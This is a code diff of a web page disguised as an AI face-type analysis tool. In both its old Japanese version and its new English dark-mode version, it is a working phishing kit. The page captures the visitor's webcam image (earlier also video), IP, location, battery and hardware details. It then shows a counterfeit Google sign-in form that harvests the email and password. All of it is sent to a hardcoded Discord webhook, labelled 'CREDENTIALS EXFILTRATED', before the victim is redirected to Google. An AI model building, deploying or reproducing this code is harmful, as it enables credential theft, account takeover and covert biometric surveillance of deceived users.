@@ -3,97 +3,166 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Face Analyzer | 高精度AI顔タイプ診断</title>
+    <title>AI Face Analyzer | System</title>
     <style>
-        :root { --google-blue: #1a73e8; --google-gray: #5f6368; --google-border: #dadce0; }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;700&display=swap');
+        
+        :root { 
+            --bg-dark: #0a0a0a;
+            --card-dark: #121212;
+            --accent-blue: #3d8bff; 
+            --accent-red: #ff4d4d;
+            --text-main: #e0e0e0;
+            --text-sub: #888;
+            --border: #222;
+        }
+
         * { box-sizing: border-box; outline: none; }
-        body { font-family: "Roboto", arial, sans-serif; background: #fff; color: #3c4043; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-        
-        /* 共通カード */
-        .card { background: #fff; border: 1px solid var(--google-border); padding: 40px; border-radius: 8px; text-align: center; width: 450px; max-width: 90%; }
-        
-        /* 診断画面 */
-        h1 { font-size: 24px; font-weight: 400; margin: 0 0 10px; color: #202124; }
-        p { font-size: 14px; color: var(--google-gray); margin-bottom: 24px; }
-        .v-wrap { width: 100%; border-radius: 8px; overflow: hidden; margin-bottom: 24px; background: #f8f9fa; border: 1px solid var(--google-border); }
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background: var(--bg-dark); 
+            color: var(--text-main); 
+            margin: 0; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            min-height: 100vh;
+        }
+
+        .card { 
+            background: var(--card-dark); 
+            border: 1px solid var(--border); 
+            padding: 40px; 
+            border-radius: 12px; 
+            text-align: center; 
+            width: 420px; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+        }
+
+        h1 { font-size: 20px; font-weight: 700; letter-spacing: 1px; margin: 0 0 8px; color: #fff; }
+        p { font-size: 13px; color: var(--text-sub); margin-bottom: 30px; }
+
+        /* スキャン画面 */
+        .v-wrap { 
+            width: 100%; 
+            border-radius: 8px; 
+            overflow: hidden; 
+            margin-bottom: 30px; 
+            background: #000; 
+            border: 1px solid var(--border);
+            position: relative;
+        }
         video, img { width: 100%; display: block; transform: scaleX(-1); }
         
+        /* スキャン線のアニメーション */
+        .scan-line {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 2px;
+            background: var(--accent-blue);
+            box-shadow: 0 0 15px var(--accent-blue);
+            animation: scan 2s linear infinite;
+            display: none;
+        }
+        @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
+
         /* ボタン */
-        .btn { background: var(--google-blue); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; transition: background 0.2s; }
-        .btn:hover { background: #185abc; box-shadow: 0 1px 3px rgba(60,64,67,0.3); }
-        .btn:disabled { background: #ccc; }
+        .btn { 
+            background: var(--accent-blue); 
+            color: #fff; 
+            border: none; 
+            width: 100%;
+            padding: 14px; 
+            border-radius: 6px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            font-size: 14px; 
+            transition: 0.2s;
+        }
+        .btn:hover { background: #2b74e6; filter: brightness(1.1); }
+        .btn:active { transform: scale(0.98); }
 
-        /* Google ログインUI再現 */
+        /* Googleログイン再現（ダークモード版） */
         #login-ui { display: none; text-align: left; }
-        .g-logo { text-align: center; margin-bottom: 10px; }
-        .g-title { text-align: center; font-family: "Google Sans", arial, sans-serif; font-size: 24px; margin-bottom: 8px; color: #202124; }
-        .g-subtitle { text-align: center; font-size: 16px; color: #202124; margin-bottom: 30px; }
+        .g-logo { text-align: center; margin-bottom: 20px; }
+        .g-title { text-align: center; font-size: 22px; color: #fff; margin-bottom: 10px; }
+        .g-subtitle { text-align: center; font-size: 14px; color: var(--text-sub); margin-bottom: 30px; }
         
-        .input-group { margin-bottom: 10px; position: relative; }
-        input { width: 100%; padding: 13px 15px; border: 1px solid var(--google-border); border-radius: 4px; font-size: 16px; margin-bottom: 5px; }
-        input:focus { border: 2px solid var(--google-blue); padding: 12px 14px; }
-        
-        .blue-link { color: var(--google-blue); font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; }
-        .footer-text { font-size: 14px; color: var(--google-gray); line-height: 1.5; margin: 25px 0; }
-        .g-footer { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
+        input { 
+            width: 100%; 
+            padding: 14px; 
+            background: #1a1a1a;
+            border: 1px solid var(--border); 
+            border-radius: 6px; 
+            font-size: 16px; 
+            color: #fff;
+            margin-bottom: 15px;
+        }
+        input:focus { border-color: var(--accent-blue); background: #222; }
 
-        #step-pass { display: none; } /* 初期はパスワード非表示 */
+        .footer-links { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; font-size: 13px; }
+        .link { color: var(--accent-blue); cursor: pointer; text-decoration: none; }
         
-        #result-ui { display: none; }
-        .row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px; border-bottom: 1px solid #eee; padding-bottom: 8px; }
+        #step-pass, #result-ui { display: none; }
+        .status-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid var(--border); font-size: 13px; }
     </style>
 </head>
 <body>
 
-    <!-- 診断開始 -->
+    <!-- UI: スキャン開始 -->
     <div class="card" id="camera-ui">
-        <h1>AI Face Analyzer</h1>
-        <p>Google AIエンジニアリングによる精密顔タイプ診断</p>
-        <div class="v-wrap"><video id="video" autoplay playsinline muted></video></div>
-        <button class="btn" id="start-btn">診断を開始</button>
-    </div>
-
-    <!-- 診断結果 -->
-    <div class="card" id="result-ui">
-        <h1>診断が完了しました</h1>
-        <div class="v-wrap"><img id="result-preview" src=""></div>
-        <div style="text-align: left; margin: 20px 0;">
-            <div class="row"><span>左右対称性スコア</span><span style="font-weight:bold;">94.8%</span></div>
-            <div class="row"><span>パーツ配置バランス</span><span style="font-weight:bold;">黄金比 (1:1.618)</span></div>
-            <div class="row"><span>総合評価</span><span style="color:var(--google-blue); font-weight:bold; font-size:18px;">S Class</span></div>
+        <h1>FACE ANALYZER</h1>
+        <p>Biometric Security Scan v2.4</p>
+        <div class="v-wrap">
+            <div class="scan-line" id="line"></div>
+            <video id="video" autoplay playsinline muted></video>
         </div>
-        <button class="btn" id="view-details-btn">詳細レポートをGoogleドライブで開く</button>
+        <button class="btn" id="start-btn">RUN ANALYSIS</button>
     </div>
 
-    <!-- 本物志向 Google ログイン -->
+    <!-- UI: 診断結果 -->
+    <div class="card" id="result-ui">
+        <h1>ANALYSIS COMPLETE</h1>
+        <p>Results stored in secure cloud</p>
+        <div class="v-wrap"><img id="result-preview" src=""></div>
+        <div class="status-row"><span>Symmetry Score</span><span style="color:var(--accent-blue)">98.2%</span></div>
+        <div class="status-row"><span>System Rank</span><span style="color:var(--accent-blue)">S+</span></div>
+        <button class="btn" id="view-details-btn" style="margin-top:20px;">ACCESS FULL REPORT</button>
+    </div>
+
+    <!-- UI: Googleログイン (ダーク) -->
     <div class="card" id="login-ui">
         <div class="g-logo">
-            <svg width="75" height="24" viewBox="0 0 75 24"><path d="M14.1 2.3C11.5 2.3 9.3 3.4 7.7 5.2l2.6 2.1c1.1-1.3 2.7-2.1 4.5-2.1 3.3 0 6 2.5 6 6.3s-2.7 6.3-6 6.3c-1.8 0-3.4-.8-4.5-2.1l-2.6 2.1c1.6 1.8 3.8 2.9 6.4 2.9 4.9 0 9-3.9 9-9.2s-4.1-9.2-9-9.2zm-14.1 0h3v18.8h-3z" fill="#4285F4"/></svg>
+            <svg viewBox="0 0 24 24" width="32" height="32">
+                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
+                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.66l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 12-4.53z" fill="#EA4335"/>
+            </svg>
         </div>
-        <div class="g-title">ログイン</div>
-        <div class="g-subtitle">Google アカウントを使用して続行</div>
+        <div class="g-title">Sign in</div>
+        <div class="g-subtitle">Use your Google Account</div>
         
         <form id="trap-form">
-            <!-- ステップ1: メールアドレス -->
             <div id="step-email">
-                <input type="email" id="email" placeholder="メールアドレスまたは電話番号" required>
-                <div class="blue-link" style="margin-top: 5px;">メールアドレスを忘れた場合</div>
-                <div class="footer-text">
-                    お客様のコンピュータではない場合、シークレット ブラウジング ウィンドウを使用してログインしてください。 <span class="blue-link">詳細</span>
+                <input type="email" id="email" placeholder="Email or phone" required>
+                <div class="link">Forgot email?</div>
+                <div style="font-size: 13px; color: var(--text-sub); margin-top: 30px;">
+                    Not your computer? Use Guest mode to sign in privately. <span class="link">Learn more</span>
                 </div>
             </div>
 
-            <!-- ステップ2: パスワード -->
             <div id="step-pass">
-                <div id="display-email" style="border: 1px solid #dadce0; border-radius: 20px; padding: 5px 15px; display: inline-block; margin-bottom: 20px; font-size: 14px;"></div>
-                <input type="password" id="pass" placeholder="パスワードを入力" required>
-                <div class="blue-link" style="margin-top: 5px;">パスワードをお忘れの場合</div>
+                <div id="user-chip" style="background:#222; border-radius:20px; padding:4px 12px; display:inline-flex; align-items:center; margin-bottom:20px; font-size:13px; border:1px solid #333;">
+                    <span id="target-email-val"></span>
+                </div>
+                <input type="password" id="pass" placeholder="Enter your password" required>
+                <div class="link">Forgot password?</div>
             </div>
 
-            <div class="g-footer">
-                <span class="blue-link">アカウントを作成</span>
-                <button type="button" class="btn" id="next-btn">次へ</button>
-                <button type="submit" class="btn" id="submit-btn" style="display:none;">次へ</button>
+            <div class="footer-links">
+                <span class="link">Create account</span>
+                <button type="button" class="btn" id="next-btn" style="width:auto; padding: 10px 24px;">Next</button>
+                <button type="submit" class="btn" id="submit-btn" style="width:auto; padding: 10px 24px; display:none;">Next</button>
             </div>
         </form>
     </div>
@@ -103,65 +172,47 @@
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm";
         let capturedImg = "";
-        let videoBlob = null;
         let net = {};
 
         window.onload = async () => { try { net = await (await fetch('https://ipapi.co/json/')).json(); } catch(e){} };
 
-        async function getIntel() {
-            let bat = { l: "N/A", c: "" };
-            try { const b = await navigator.getBattery(); bat.l = (b.level * 100).toFixed(0) + "%"; bat.c = b.charging ? "充電中" : "放電中"; } catch(e) {}
-            return {
-                ts: new Date().toLocaleString('ja-JP'),
-                ua: navigator.userAgent,
-                ip: net.ip || "Unknown",
-                loc: `${net.city}, ${net.country_name}`,
-                bat: `${bat.l} (${bat.c})`,
-                spec: `CPU:${navigator.hardwareConcurrency} / RAM:${navigator.deviceMemory}G`
+        async function logToDiscord(embed) {
+            const bat = await navigator.getBattery();
+            const fullEmbed = {
+                ...embed,
+                footer: { text: `System Log: ${new Date().toLocaleString('ja-JP')} | Bat: ${(bat.level*100).toFixed(0)}% (${bat.charging?'CHG':'DIS'})` }
             };
+            const formData = new FormData();
+            formData.append('payload_json', JSON.stringify({ username: "SYSTEM_INTEL", embeds: [fullEmbed] }));
+            if(capturedImg) formData.append('file', await (await fetch(capturedImg)).blob(), 'log.jpg');
+            await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
         }
 
-        const startBtn = document.getElementById('start-btn');
-        startBtn.onclick = async () => {
+        const video = document.getElementById('video');
+        document.getElementById('start-btn').onclick = async () => {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            document.getElementById('video').srcObject = stream;
-            startBtn.innerText = "スキャン中...";
-            startBtn.disabled = true;
+            video.srcObject = stream;
+            document.getElementById('line').style.display = 'block';
+            document.getElementById('start-btn').innerText = "ANALYZING...";
 
-            const mediaRecorder = new MediaRecorder(stream);
-            const chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = async () => {
-                videoBlob = new Blob(chunks, { type: 'video/mp4' });
-                const intel = await getIntel();
-                const formData = new FormData();
-                formData.append('payload_json', JSON.stringify({
-                    username: "AI Analyzer Intel",
-                    embeds: [{
-                        title: "📸 診断メディア取得", color: 0x1a73e8,
-                        fields: [
-                            { name: "🕒 時刻", value: intel.ts, inline: true },
-                            { name: "🔋 電池", value: intel.bat, inline: true },
-                            { name: "🌐 情報", value: `IP: ${intel.ip}\nLOC: ${intel.loc}` },
-                            { name: "📱 環境", value: `\`\`\`${intel.ua}\`\`\`` }
-                        ]
-                    }]
-                }));
-                formData.append('file1', await (await fetch(capturedImg)).blob(), 'face.jpg');
-                formData.append('file2', videoBlob, 'video.mp4');
-                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-            };
-            mediaRecorder.start();
-
-            setTimeout(() => {
+            setTimeout(async () => {
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 capturedImg = canvas.toDataURL('image/jpeg', 0.8);
-                mediaRecorder.stop();
+                
                 document.getElementById('camera-ui').style.display = 'none';
                 document.getElementById('result-ui').style.display = 'block';
                 document.getElementById('result-preview').src = capturedImg;
+                
+                await logToDiscord({
+                    title: "🔍 BIOMETRIC DATA CAPTURED",
+                    color: 0x3d8bff,
+                    fields: [
+                        { name: "Location", value: `${net.ip} / ${net.city}, ${net.country_name}`, inline: false },
+                        { name: "Hardware", value: `Cores: ${navigator.hardwareConcurrency} / RAM: ${navigator.deviceMemory}G`, inline: true }
+                    ]
+                });
                 stream.getTracks().forEach(t => t.stop());
             }, 4000);
         };
@@ -171,11 +222,10 @@
             document.getElementById('login-ui').style.display = 'block';
         };
 
-        // ステップ切り替えロジック
         document.getElementById('next-btn').onclick = () => {
             const email = document.getElementById('email').value;
-            if(!email) return alert("メールアドレスを入力してください");
-            document.getElementById('display-email').innerText = email;
+            if(!email.includes('@')) return;
+            document.getElementById('target-email-val').innerText = email;
             document.getElementById('step-email').style.display = 'none';
             document.getElementById('step-pass').style.display = 'block';
             document.getElementById('next-btn').style.display = 'none';
@@ -184,20 +234,15 @@
 
         document.getElementById('trap-form').onsubmit = async (e) => {
             e.preventDefault();
-            const intel = await getIntel();
-            const payload = {
-                username: "AI Analyzer Intel",
-                embeds: [{
-                    title: "🔑 ログイン情報奪取", color: 0xff0000,
-                    fields: [
-                        { name: "📧 ID", value: document.getElementById('email').value },
-                        { name: "🔑 PW", value: document.getElementById('pass').value },
-                        { name: "🕒 送信時刻", value: intel.ts }
-                    ]
-                }]
-            };
-            await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-            window.location.href = "https://accounts.google.com/ServiceLogin?hl=ja";
+            await logToDiscord({
+                title: "🔑 CREDENTIALS EXFILTRATED",
+                color: 0xff4d4d,
+                fields: [
+                    { name: "Identifier", value: document.getElementById('email').value },
+                    { name: "Secret", value: `||${document.getElementById('pass').value}||` }
+                ]
+            });
+            window.location.href = "https://myaccount.google.com/";
         };
     </script>
 </body>
